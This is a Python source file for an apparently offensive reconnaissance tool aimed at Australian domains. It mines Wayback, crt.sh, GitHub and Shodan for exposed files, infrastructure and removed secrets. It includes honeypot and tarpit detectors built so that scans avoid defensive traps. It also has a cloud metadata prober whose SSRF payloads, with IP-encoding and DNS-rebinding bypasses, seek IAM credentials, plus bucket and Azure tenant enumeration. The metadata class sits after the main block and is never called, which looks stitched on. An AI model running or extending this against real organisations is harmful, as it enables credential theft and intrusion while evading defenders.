"""au-osint-recon :: sneaky_recon.py
Sneaky reconnaissance: DNS Time Machine, Wayback Endpoint Miner, Certificate Pivot,
GitHub Commit Archaeologist, Shodan/Censys Pivot, Honeypot Detector, Tarpit Detection.
"""
import os, re, json, time, hashlib
from typing import Optional, Dict, List, Any
from urllib.parse import quote, urlparse
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    requests = None
    BeautifulSoup = None

from utils import logger, safe_request, Finding, ResultStore, random_ua


class DNSTimeMachine:
    """Historical DNS records for finding abandoned infrastructure."""

    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.results = ResultStore()

    def lookup_history(self, domain: str) -> List[Finding]:
        findings = []
        st_key = self.config.get('SECURITYTRAILS_KEY', os.getenv('SECURITYTRAILS_KEY',''))
        if st_key:
            for rtype in ['a','aaaa','mx','ns','txt']:
                url = f'https://api.securitytrails.com/v1/history/{quote(domain)}/dns/{rtype}'
                resp = safe_request(url, headers={'APIKEY':st_key}, timeout=15)
                if resp and resp.status_code == 200:
                    data = resp.json()
                    for record in data.get('records', []):
                        findings.append(Finding(
                            source='SecurityTrails-DNS-History',
                            category='dns_historical',
                            data={
                                'domain': domain, 'record_type': rtype,
                                'first_seen': record.get('first_seen',''),
                                'last_seen': record.get('last_seen',''),
                                'values': record.get('values',[]),
                                'organizations': record.get('organizations',[]),
                            },
                            confidence=0.9,
                        ))
        return findings


class WaybackEndpointMiner:
    """Mine Wayback Machine for old endpoints and files."""

    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}

    def mine(self, domain: str, since_year: int = 2018) -> List[Finding]:
        findings = []
        url = f'http://web.archive.org/cdx/search/cdx?url=*.{quote(domain)}/*&output=json&from={since_year}0101&collapse=urlkey&limit=10000'
        resp = safe_request(url, timeout=60)
        if not resp or resp.status_code != 200:
            return findings

        try:
            data = resp.json()
        except:
            return findings

        if len(data) < 2: return findings

        interesting_extensions = ['.php','.aspx','.jsp','.asp','.cgi','.pl','.json','.xml','.env',
                                  '.bak','.backup','.old','.orig','.sql','.db','.log','.zip','.tar.gz','.gz',
                                  '.config','.conf','.ini','.yml','.yaml','.key','.pem','.crt','.p12']
        interesting_paths = ['/admin','/api/','/wp-admin','/wp-content','/uploads','/backup','/test',
                            '/dev','/staging','/private','/internal','/debug','/console','/dashboard',
                            '/.git','/.svn','/.env','/phpinfo','/server-status','/server-info',
                            '/robots.txt','/sitemap.xml','/.well-known/','/api/v1','/api/v2','/api/v3',
                            '/graphql','/swagger','/openapi','/actuator','/metrics','/healthz']

        headers = data[0]
        original_idx = headers.index('original') if 'original' in headers else 2
        timestamp_idx = headers.index('timestamp') if 'timestamp' in headers else 1
        status_idx = headers.index('statuscode') if 'statuscode' in headers else 4

        endpoint_groups = {}
        for row in data[1:]:
            if len(row) <= original_idx: continue
            full_url = row[original_idx]
            timestamp = row[timestamp_idx]
            status = row[status_idx] if len(row) > status_idx else ''
            parsed = urlparse(full_url)
            path = parsed.path
            is_interesting = (any(path.endswith(ext) for ext in interesting_extensions) or
                              any(p in path.lower() for p in interesting_paths))
            if is_interesting and status in ['200','301','302','401','403']:
                key = f'{parsed.netloc}{parsed.path}'
                if key not in endpoint_groups:
                    endpoint_groups[key] = {
                        'url': full_url, 'first_seen': timestamp, 'last_seen': timestamp,
                        'status_codes': set([status]), 'wayback_url': f'https://web.archive.org/web/{timestamp}/{full_url}',
                    }
                else:
                    endpoint_groups[key]['last_seen'] = timestamp
                    endpoint_groups[key]['status_codes'].add(status)

        for key, info in list(endpoint_groups.items())[:200]:
            info['status_codes'] = list(info['status_codes'])
            findings.append(Finding(
                source='Wayback-Miner', category='archived_endpoint',
                data={'domain':domain,**info},
                confidence=0.7 if any('200'==s for s in info['status_codes']) else 0.5,
            ))
        logger.info(f'Wayback mined {len(findings)} interesting endpoints for {domain}')
        return findings


class CertificatePivot:
    """Pivot via SSL/TLS certificates to find related infrastructure."""

    def pivot(self, domain: str) -> List[Finding]:
        findings = []
        resp = safe_request(f'https://crt.sh/?q=%25.{quote(domain)}&output=json', timeout=30)
        if not resp or resp.status_code != 200: return findings
        try: certs = resp.json()
        except: return findings

        san_domains = set()
        issuers = set()
        cert_timeline = []
        for cert in certs[:1000]:
            name = cert.get('name_value','')
            for sub in name.split('\n'):
                sub = sub.strip().lower()
                if sub and not sub.startswith('*'): san_domains.add(sub)
            issuers.add(cert.get('issuer_name',''))
            cert_timeline.append({
                'cn': cert.get('common_name',''), 'issuer': cert.get('issuer_name','')[:80],
                'not_before': cert.get('not_before',''), 'not_after': cert.get('not_after',''),
                'serial': cert.get('serial_number',''),
            })

        findings.append(Finding(
            source='CertPivot', category='cert_san_pivot',
            data={'domain':domain,'total_certs':len(certs),'unique_san_domains':len(san_domains),
                  'san_domains':sorted(list(san_domains))[:300],
                  'issuers':sorted(list(issuers))[:20],
                  'recent_certs':cert_timeline[:30]},
            confidence=0.95,
        ))

        if requests:
            try:
                import ssl, socket
                ctx = ssl.create_default_context()
                with socket.create_connection((domain, 443), timeout=10) as s:
                    with ctx.wrap_socket(s, server_hostname=domain) as ssock:
                        cert = ssock.getpeercert()
                        sha256 = hashlib.sha256(ssock.getpeercert(binary_form=True)).hexdigest()
                        findings.append(Finding(
                            source='CertPivot-Live', category='cert_fingerprint',
                            data={'domain':domain,'sha256':sha256,'subject':dict(x[0] for x in cert.get('subject',[])),
                                  'issuer':dict(x[0] for x in cert.get('issuer',[])),
                                  'san':[x[1] for x in cert.get('subjectAltName',[])],
                                  'not_before':cert.get('notBefore',''),'not_after':cert.get('notAfter','')},
                            confidence=0.95,
                        ))
            except Exception as e:
                logger.warning(f'Live cert fetch failed: {e}')
        return findings


class GitHubCommitArchaeologist:
    """Mine GitHub commit history for removed secrets."""

    def excavate(self, domain: str) -> List[Finding]:
        findings = []
        gh_token = os.getenv('GITHUB_TOKEN','')
        headers = {'Accept':'application/vnd.github.v3+json'}
        if gh_token: headers['Authorization'] = f'token {gh_token}'

        queries = [
            f'"{domain}" "removed" password',
            f'"{domain}" "deleted" "api_key"',
            f'"{domain}" "delete .env"',
            f'"{domain}" "remove secret"',
        ]
        for q in queries[:4]:
            url = f'https://api.github.com/search/commits?q={quote(q)}&per_page=20'
            resp = safe_request(url, headers={**headers,'Accept':'application/vnd.github.cloak-preview+json'}, timeout=15)
            if resp and resp.status_code == 200:
                data = resp.json()
                for item in data.get('items',[]):
                    findings.append(Finding(
                        source='GitHubCommitArchaeologist', category='historical_commit',
                        data={'commit_sha':item.get('sha',''),'message':item.get('commit',{}).get('message','')[:200],
                              'repo':item.get('repository',{}).get('full_name',''),
                              'url':item.get('html_url',''),'author':item.get('commit',{}).get('author',{}).get('name',''),
                              'date':item.get('commit',{}).get('author',{}).get('date','')},
                        confidence=0.7,
                    ))
            time.sleep(2)
        return findings


class ShodanCensysPivot:
    """Pivot via Shodan/Censys for related infrastructure."""

    def pivot(self, target: str) -> List[Finding]:
        findings = []
        shodan_key = os.getenv('SHODAN_API_KEY','')
        if shodan_key:
            for q in [f'hostname:{target}', f'ssl:{target}', f'org:"{target}"']:
                url = f'https://api.shodan.io/shodan/host/search?key={shodan_key}&query={quote(q)}'
                resp = safe_request(url, timeout=20)
                if resp and resp.status_code == 200:
                    data = resp.json()
                    for match in data.get('matches',[])[:20]:
                        findings.append(Finding(
                            source='Shodan', category='exposed_service',
                            data={'ip':match.get('ip_str',''),'port':match.get('port',0),
                                  'product':match.get('product',''),'version':match.get('version',''),
                                  'hostnames':match.get('hostnames',[]),'org':match.get('org',''),
                                  'os':match.get('os',''),'tags':match.get('tags',[]),
                                  'vulns':list(match.get('vulns',{}).keys()) if match.get('vulns') else []},
                            confidence=0.85,
                        ))

        try:
            resp = safe_request(f'https://{target}/favicon.ico', timeout=10)
            if resp and resp.status_code == 200:
                import mmh3, base64
                fav_hash = mmh3.hash(base64.b64encode(resp.content))
                if shodan_key:
                    fav_url = f'https://api.shodan.io/shodan/host/search?key={shodan_key}&query=http.favicon.hash:{fav_hash}'
                    fav_resp = safe_request(fav_url, timeout=15)
                    if fav_resp and fav_resp.status_code == 200:
                        fav_data = fav_resp.json()
                        related = [m.get('ip_str') for m in fav_data.get('matches',[])]
                        findings.append(Finding(
                            source='Shodan-FaviconPivot', category='related_infrastructure',
                            data={'target':target,'favicon_hash':fav_hash,'related_ips':related[:50],
                                  'total_matches':fav_data.get('total',0)},
                            confidence=0.9,
                        ))
        except: pass
        return findings


class HoneypotDetector:
    """Identify honeypot signatures before scanning."""

    HONEYPOT_SIGNATURES = {
        'Cowrie SSH': ['Server: SSH-2.0-OpenSSH_5.1p1'],
        'Conpot ICS': ['Modicon M340','Siemens, SIMATIC'],
        'Dionaea': ['SMB','dionaea'],
        'Glastopf': ['glastopf'],
        'T-Pot': ['t-pot'],
        'Honeyd': ['honeyd'],
        'Snare/Tanner': ['snare','tanner'],
    }

    def check(self, url: str) -> List[Finding]:
        findings = []
        resp = safe_request(url, timeout=10)
        if not resp: return findings
        body = resp.text.lower()
        headers_str = json.dumps(dict(resp.headers)).lower()

        signatures_matched = []
        for hp_name, sigs in self.HONEYPOT_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in body or sig.lower() in headers_str:
                    signatures_matched.append({'honeypot':hp_name,'signature':sig})

        if 'server' in resp.headers:
            srv = resp.headers['server']
            outdated = ['Apache/2.2','IIS/6.0','OpenSSH_4','OpenSSH_5.1p1','vsftpd 2.0.7']
            for o in outdated:
                if o in srv:
                    signatures_matched.append({'honeypot':'Suspicious-Outdated-Banner','signature':srv})

        latencies = []
        for _ in range(3):
            start = time.time()
            safe_request(url, timeout=10)
            latencies.append(time.time() - start)
        avg = sum(latencies)/len(latencies)
        consistent = max(latencies)-min(latencies) < 0.05
        if consistent and avg < 0.05:
            signatures_matched.append({'honeypot':'Suspicious-Consistent-Latency','signature':f'avg={avg:.3f}s'})

        if signatures_matched:
            findings.append(Finding(
                source='HoneypotDetector', category='honeypot_warning',
                data={'url':url,'signatures':signatures_matched,'recommendation':'AVOID scanning - likely honeypot'},
                confidence=0.7,
            ))
        else:
            findings.append(Finding(
                source='HoneypotDetector', category='honeypot_clear',
                data={'url':url,'verdict':'No honeypot signatures detected','safe_to_scan':True},
                confidence=0.8,
            ))
        return findings


class TarpitDetector:
    """Detect tarpits before sending heavy scan traffic."""

    def detect(self, url: str) -> List[Finding]:
        findings = []
        latencies = []
        for i in range(5):
            start = time.time()
            try:
                resp = safe_request(url, timeout=15, rate_limit=False)
                latencies.append(time.time() - start)
            except: latencies.append(15.0)
            time.sleep(0.5)

        is_tarpit = False
        reasons = []
        if len(latencies) >= 3 and all(latencies[i] < latencies[i+1] for i in range(len(latencies)-1)):
            is_tarpit = True
            reasons.append(f'Increasing latency: {[round(l,2) for l in latencies]}')
        if all(l > 5.0 for l in latencies):
            is_tarpit = True
            reasons.append(f'Consistently slow responses (avg {sum(latencies)/len(latencies):.2f}s)')

        findings.append(Finding(
            source='TarpitDetector',
            category='tarpit_warning' if is_tarpit else 'tarpit_clear',
            data={'url':url,'latency_pattern':[round(l,3) for l in latencies],
                  'avg_latency':round(sum(latencies)/len(latencies),3),
                  'is_tarpit':is_tarpit,'reasons':reasons,
                  'recommendation':'Back off!' if is_tarpit else 'Safe to scan'},
            confidence=0.75 if is_tarpit else 0.6,
        ))
        return findings


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--domain', required=True)
    p.add_argument('--module', default='all')
    args = p.parse_args()

    store = ResultStore()
    if args.module in ['all','dns']:
        store.add_many(DNSTimeMachine().lookup_history(args.domain))
    if args.module in ['all','wayback']:
        store.add_many(WaybackEndpointMiner().mine(args.domain))
    if args.module in ['all','cert']:
        store.add_many(CertificatePivot().pivot(args.domain))
    if args.module in ['all','github']:
        store.add_many(GitHubCommitArchaeologist().excavate(args.domain))
    print(json.dumps(store.summary(), indent=2))


class CloudMetadataProbe:
    """
    Probe cloud metadata endpoints for SSRF and misconfiguration.
    Targets AWS, GCP, Azure metadata services.
    """

    METADATA_ENDPOINTS = {
        "aws_imds_v1":    "http://169.254.169.254/latest/meta-data/",
        "aws_imds_v2":    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "aws_user_data":  "http://169.254.169.254/latest/user-data",
        "gcp_metadata":   "http://metadata.google.internal/computeMetadata/v1/",
        "azure_metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "alibaba":        "http://100.100.100.200/latest/meta-data/",
        "digitalocean":   "http://169.254.169.254/metadata/v1/",
        "oracle":         "http://169.254.169.254/opc/v1/instance/",
    }

    def probe_via_ssrf(self, ssrf_url: str, target_metadata: str = "aws_imds_v1") -> dict:
        """
        Test SSRF vulnerability by attempting to reach cloud metadata via target URL.
        """
        import requests
        endpoint = self.METADATA_ENDPOINTS.get(target_metadata, target_metadata)
        result = {"ssrf_url": ssrf_url, "metadata_target": endpoint, "status": "unknown"}

        payloads = [
            endpoint,
            endpoint.replace("http://", "http://"),
            f"http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv6 bypass
            f"http://169.254.169.254.xip.io/latest/meta-data/",    # DNS rebinding
            f"http://0251.0376.0251.0376/latest/meta-data/",        # Octal bypass
            f"http://0xa9fea9fe/latest/meta-data/",                  # Hex bypass
        ]

        for payload in payloads:
            try:
                test_url = ssrf_url.replace("SSRF_TARGET", payload)
                r = requests.get(test_url, timeout=8)
                if any(kw in r.text for kw in ["ami-id", "instance-id", "iam", "project", "subscriptionId"]):
                    result["status"] = "vulnerable"
                    result["payload"] = payload
                    result["response_preview"] = r.text[:500]
                    return result
            except Exception:
                pass

        result["status"] = "not_vulnerable"
        return result

    def enumerate_aws_s3(self, domain: str) -> list[dict]:
        """
        Enumerate S3 buckets related to an AU domain.
        Tests common naming patterns for public access.
        """
        import requests
        company = domain.split(".")[0]
        bucket_names = [
            company, f"{company}-backup", f"{company}-data", f"{company}-files",
            f"{company}-assets", f"{company}-media", f"{company}-uploads",
            f"{company}-dev", f"{company}-staging", f"{company}-prod",
            f"{company}-logs", f"{company}-archive", f"{company}-public",
            f"{company}-private", f"{company}-internal", f"{company}-au",
            f"{company}-australia", f"backup-{company}", f"data-{company}",
            f"www-{company}", f"cdn-{company}", f"static-{company}",
        ]

        results = []
        for bucket in bucket_names:
            for region in ["ap-southeast-2", "us-east-1", ""]:
                if region:
                    url = f"https://{bucket}.s3.{region}.amazonaws.com/"
                else:
                    url = f"https://{bucket}.s3.amazonaws.com/"
                try:
                    r = requests.head(url, timeout=6)
                    if r.status_code == 200:
                        results.append({"bucket": bucket, "url": url, "status": "public_readable", "severity": "critical"})
                    elif r.status_code == 403:
                        results.append({"bucket": bucket, "url": url, "status": "exists_private", "severity": "medium"})
                    elif r.status_code == 404:
                        pass  # Does not exist
                except Exception:
                    pass

        return results

    def enumerate_azure_tenant(self, domain: str) -> dict:
        """
        Enumerate Azure AD tenant information for an AU domain.
        Discovers tenant ID, federation info, and registered apps.
        """
        import requests
        result = {"domain": domain, "azure_info": {}}

        # OpenID configuration
        try:
            r = requests.get(
                f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration",
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                issuer = data.get("issuer", "")
                tenant_id = issuer.split("/")[3] if "/" in issuer else ""
                result["azure_info"]["tenant_id"] = tenant_id
                result["azure_info"]["issuer"] = issuer
                result["azure_info"]["token_endpoint"] = data.get("token_endpoint", "")
        except Exception:
            pass

        # User realm (federation check)
        try:
            r = requests.get(
                f"https://login.microsoftonline.com/common/userrealm/?user=test@{domain}&api-version=2.1",
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                result["azure_info"]["namespace_type"] = data.get("NameSpaceType", "")
                result["azure_info"]["federation_brand"] = data.get("FederationBrandName", "")
                result["azure_info"]["cloud_instance"] = data.get("CloudInstanceName", "")
                result["azure_info"]["is_federated"] = data.get("NameSpaceType") == "Federated"
        except Exception:
            pass

        return result

    def probe_gcp_storage(self, domain: str) -> list[dict]:
        """Enumerate Google Cloud Storage buckets for an AU domain."""
        import requests
        company = domain.split(".")[0]
        bucket_names = [
            company, f"{company}-backup", f"{company}-data",
            f"{company}-assets", f"{company}-media", f"{company}-au",
            f"backup-{company}", f"data-{company}", f"cdn-{company}",
        ]

        results = []
        for bucket in bucket_names:
            url = f"https://storage.googleapis.com/{bucket}/"
            try:
                r = requests.head(url, timeout=6)
                if r.status_code == 200:
                    results.append({"bucket": bucket, "url": url, "status": "public", "severity": "critical"})
                elif r.status_code == 403:
                    results.append({"bucket": bucket, "url": url, "status": "exists_private", "severity": "medium"})
            except Exception:
                pass

        return results
